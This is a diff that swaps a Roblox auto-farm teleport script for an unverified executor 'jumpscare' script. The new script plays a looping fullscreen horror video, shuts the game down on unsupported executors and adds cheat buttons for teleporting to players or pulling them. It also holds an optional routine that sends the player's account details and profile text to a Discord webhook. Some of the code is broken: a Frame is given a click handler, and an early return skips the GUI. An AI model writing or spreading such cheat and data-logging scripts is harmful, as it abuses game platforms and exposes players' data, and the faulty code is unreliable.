@@ -1,208 +1,201 @@
-local TweenService = game:GetService("TweenService")
+--[[
+    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+if jumpscare_jeffwuz_loaded and not _G.jumpscarefucking123 == true then
+    warn("Already Loading")
+    return
+end
+
+pcall(function() getgenv().jumpscare_jeffwuz_loaded = true end)
+
+getgenv().Notify = false
+local Notify_Webhook = "Your Discord Webhook"
+
+if not getcustomasset then
+    game:Shutdown() -- Fucked out
+end
+
+local player = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService('HttpService')
 local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local player = Players.LocalPlayer
+local ScreenGui = Instance.new("ScreenGui")
+local VideoScreen = Instance.new("VideoFrame")
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Name = "JeffTheKillerWuzHere"
 
--- 🔽 ANIMASI "BY : Xraxor CMNY" 🔽
-do
-    local introGui = Instance.new("ScreenGui")
-    introGui.Name = "IntroAnimation"
-    introGui.ResetOnSpawn = false
-    introGui.Parent = player:WaitForChild("PlayerGui")
+VideoScreen.Parent = ScreenGui
+VideoScreen.Size = UDim2.new(1, 0, 1, 0)
 
-    local introLabel = Instance.new("TextLabel")
-    introLabel.Size = UDim2.new(0, 300, 0, 50)
-    introLabel.Position = UDim2.new(0.5, -150, 0.4, 0)
-    introLabel.BackgroundTransparency = 1
-    introLabel.Text = "By : Xraxor CMNY"
-    introLabel.TextColor3 = Color3.fromRGB(40, 40, 40)
-    introLabel.TextScaled = true
-    introLabel.Font = Enum.Font.GothamBold
-    introLabel.Parent = introGui
+writefile("yes.mp4", game:HttpGet("https://github.com/HappyCow91/RobloxScripts/blob/main/Videos/videoplayback.mp4?raw=true"))
 
-    local tweenInfoMove = TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
-    local tweenMove = TweenService:Create(introLabel, tweenInfoMove, {Position = UDim2.new(0.5, -150, 0.42, 0)})
+VideoScreen.Video = getcustomasset("yes.mp4")
+VideoScreen.Looped = true
+VideoScreen.Playing = true
+VideoScreen.Volume = 10
 
-    local tweenInfoColor = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
-    local tweenColor = TweenService:Create(introLabel, tweenInfoColor, {TextColor3 = Color3.fromRGB(0, 0, 0)})
+function notify_hook()
+    -- Thumb API
+    local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true")
+    local json = HttpService:JSONDecode(ThumbnailAPI)
+    local avatardata = json.data[1].imageUrl
 
-    tweenMove:Play()
-    tweenColor:Play()
+    -- User API Script
+    local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..player.UserId)
+    local json = HttpService:JSONDecode(UserAPI)
 
-    task.wait(2)
-    local fadeOut = TweenService:Create(introLabel, TweenInfo.new(0.5), {TextTransparency = 1})
-    fadeOut:Play()
-    fadeOut.Completed:Connect(function()
-        introGui:Destroy()
-    end)
+    -- Description Data
+    local DescriptionData = json.description
+    -- Created Data
+    local CreatedData = json.created
+
+    local send_data = {
+        ["username"] = "Jumpscare Notify",
+        ["avatar_url"] = "https://static.wikia.nocookie.net/19dbe80e-0ae6-48c7-98c7-3c32a39b2d7c/scale-to-width/370",
+        ["content"] = "Jeff Wuz Here !",
+        ["embeds"] = {
+            {
+                ["title"] = "Jeff's Log",
+                ["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n\n**Job ID : "..game.JobId.."**",
+                ["color"] = 4915083,
+                ["fields"] = {
+                    {
+                        ["name"] = "Username",
+                        ["value"] = player.Name,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Display Name",
+                        ["value"] = player.DisplayName,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "User ID",
+                        ["value"] = player.UserId,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Account Age",
+                        ["value"] = player.AccountAge.." Day",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Membership",
+                        ["value"] = player.MembershipType.Name,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Account Created Day",
+                        ["value"] = string.match(CreatedData, "^([%d-]+)"),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Profile Description",
+                        ["value"] = "```\n"..DescriptionData.."\n```",
+                        ["inline"] = true
+                    }
+                },
+                ["footer"] = {
+                    ["text"] = "JTK Log",
+                    ["icon_url"] = "https://miro.medium.com/v2/resize:fit:1280/0*c6-eGC3Dd_3HoF-B"
+                },
+                ["thumbnail"] = {
+                    ["url"] = avatardata
+                }
+            }
+        },
+    }
+
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    request({
+        Url = Notify_Webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = game:GetService("HttpService"):JSONEncode(send_data)
+    })
 end
 
--- 🔽 Status AutoFarm 🔽
-local statusValue = ReplicatedStorage:FindFirstChild("AutoFarmStatus")
-if not statusValue then
-    statusValue = Instance.new("BoolValue")
-    statusValue.Name = "AutoFarmStatus"
-    statusValue.Value = false
-    statusValue.Parent = ReplicatedStorage
-end
-
--- 🔽 GUI Utama 🔽
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "AutoFarmGUI"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = player:WaitForChild("PlayerGui")
-
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 220, 0, 200)
-frame.Position = UDim2.new(0.4, -110, 0.5, -100)
-frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
-frame.Parent = screenGui
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 15)
-corner.Parent = frame
-
--- Judul GUI
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 30)
-title.BackgroundTransparency = 1
-title.Text = "Mount Gamon"
-title.TextColor3 = Color3.new(1, 1, 1)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 16
-title.Parent = frame
-
--- Tombol SUMMIT
-local button = Instance.new("TextButton")
-button.Size = UDim2.new(0, 160, 0, 40)
-button.Position = UDim2.new(0.5, -80, 0.5, -20)
-button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-button.Text = "SUMMIT"
-button.TextColor3 = Color3.new(1, 1, 1)
-button.Font = Enum.Font.GothamBold
-button.TextSize = 15
-button.Parent = frame
-
-local buttonCorner = Instance.new("UICorner")
-buttonCorner.CornerRadius = UDim.new(0, 10)
-buttonCorner.Parent = button
-
--- Label Status
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, 0, 0, 20)
-statusLabel.Position = UDim2.new(0, 0, 1, -25)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text = "Status: Inactive"
-statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-statusLabel.Font = Enum.Font.Gotham
-statusLabel.TextSize = 14
-statusLabel.Parent = frame
-
--- Tombol Auto Start
-local autoStart = false
-local autoStartButton = Instance.new("TextButton")
-autoStartButton.Size = UDim2.new(0, 160, 0, 30)
-autoStartButton.Position = UDim2.new(0.5, -80, 1, 5)
-autoStartButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-autoStartButton.Text = "Auto Start: OFF"
-autoStartButton.TextColor3 = Color3.new(1, 1, 1)
-autoStartButton.Font = Enum.Font.GothamBold
-autoStartButton.TextSize = 14
-autoStartButton.Parent = frame
-
-local autoStartCorner = Instance.new("UICorner")
-autoStartCorner.CornerRadius = UDim.new(0, 10)
-autoStartCorner.Parent = autoStartButton
-
-autoStartButton.MouseButton1Click:Connect(function()
-    autoStart = not autoStart
-    if autoStart then
-        autoStartButton.Text = "Auto Start: ON"
-        autoStartButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+if getgenv().Notify == true then
+    if Notify_Webhook == '' then
+        return
     else
-        autoStartButton.Text = "Auto Start: OFF"
-        autoStartButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+        notify_hook()
+    end
+elseif getgenv().Notify == false then
+    return
+else
+    warn("True or False")
+end
+
+-- Tambahkan GUI untuk cek list pemain dan fitur menarik pemain
+local buttonCheckPlayers = Instance.new("TextButton")
+buttonCheckPlayers.Text = "Cek List Pemain"
+buttonCheckPlayers.Size = UDim2.new(0, 200, 0, 50)
+buttonCheckPlayers.Position = UDim2.new(0, 10, 0, 10)
+buttonCheckPlayers.Parent = ScreenGui
+buttonCheckPlayers.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+
+local buttonTeleport = Instance.new("TextButton")
+buttonTeleport.Text = "Tarik Pemain"
+buttonTeleport.Size = UDim2.new(0, 200, 0, 50)
+buttonTeleport.Position = UDim2.new(0, 10, 0, 70)
+buttonTeleport.Parent = ScreenGui
+buttonTeleport.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+
+local playerListFrame = Instance.new("Frame")
+playerListFrame.Size = UDim2.new(0, 300, 0, 300)
+playerListFrame.Position = UDim2.new(0, 220, 0, 10)
+playerListFrame.Parent = ScreenGui
+playerListFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+playerListFrame.Visible = false
+
+local playerListScroll = Instance.new("ScrollingFrame")
+playerListScroll.Size = UDim2.new(1, 0, 1, 0)
+playerListScroll.Position = UDim2.new(0, 0, 0, 0)
+playerListScroll.Parent = playerListFrame
+playerListScroll.CanvasSize = UDim2.new(0, 0, 2, 0)
+playerListScroll.ScrollBarThickness = 10
+
+-- Tampilkan daftar pemain ketika tombol cek list pemain diklik
+buttonCheckPlayers.MouseButton1Click:Connect(function()
+    playerListFrame.Visible = true
+    -- Hapus daftar pemain sebelumnya
+    for _, child in pairs(playerListScroll:GetChildren()) do
+        if child:IsA("TextButton") then
+            child:Destroy()
+        end
+    end
+
+    -- Tampilkan pemain yang ada
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= player then
+            local playerButton = Instance.new("TextButton")
+            playerButton.Text = p.Name
+            playerButton.Size = UDim2.new(1, 0, 0, 30)
+            playerButton.Parent = playerListScroll
+            playerButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            playerButton.MouseButton1Click:Connect(function()
+                -- Ketika pemain diklik, teleport ke mereka
+                player.Character:SetPrimaryPartCFrame(p.Character.HumanoidRootPart.CFrame)
+            end)
+        end
     end
 end)
 
--- 🔽 Posisi Teleport 🔽
-local position1 = Vector3.new(-655.49, 17.22, 209.03)
-local position2 = Vector3.new(1708.42, 953.88, 1387.94)
-local position3 = Vector3.new(1734.64, 1067.83, 1240.38)
-
-local teleporting = false
-
-local function teleportTo(pos)
-    local char = player.Character
-    if char and char:FindFirstChild("HumanoidRootPart") then
-        char.HumanoidRootPart.CFrame = CFrame.new(pos)
-    end
-end
-
--- 🔁 AutoFarm Sekali
-local function autoFarmOnce()
-    teleporting = true
-    statusValue.Value = true
-    button.Text = "RUNNING..."
-    button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
-    statusLabel.Text = "Status: Running (Once)"
-
-    teleportTo(position1)
-    task.wait(1)
-
-    teleportTo(position2)
-    task.wait(1)
-
-    teleportTo(position3)
-    task.wait(1)
-
-    teleporting = false
-    statusValue.Value = false
-    button.Text = "SELESAI"
-    button.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
-    statusLabel.Text = "Status: Selesai"
-end
-
--- 🔁 AutoFarm Loop
-local function autoFarmLoop()
-    while teleporting do
-        teleportTo(position1)
-        task.wait(1)
-        teleportTo(position2)
-        task.wait(1)
-        teleportTo(position3)
-        task.wait(1)
-    end
-end
-
-local function toggleAutoFarm(state)
-    teleporting = state
-    statusValue.Value = state
-    if teleporting then
-        button.Text = "RUNNING..."
-        button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
-        statusLabel.Text = "Status: Active (Loop)"
-        task.spawn(autoFarmLoop)
-    else
-        button.Text = "STOP"
-        button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-        statusLabel.Text = "Status: Inactive"
-    end
-end
-
--- Tombol SUMMIT ditekan
-button.MouseButton1Click:Connect(function()
-    toggleAutoFarm(not teleporting)
+-- Menutup daftar pemain
+playerListFrame.MouseButton1Click:Connect(function()
+    playerListFrame.Visible = false
 end)
 
--- ⏱️ Jalankan AutoFarm Sekali Jika AutoStart Aktif
-task.delay(3, function()
-    if autoStart then
-        autoFarmOnce()
+-- Fitur untuk menarik pemain ke diri sendiri
+buttonTeleport.MouseButton1Click:Connect(function()
+    local targetPlayer = Players:GetPlayers()[math.random(1, #Players:GetPlayers())]  -- Ambil pemain acak
+    if targetPlayer and targetPlayer.Character then
+        -- Teleport pemain lain ke posisi pemain lokal
+        targetPlayer.Character:SetPrimaryPartCFrame(player.Character.HumanoidRootPart.CFrame)
     end
 end)
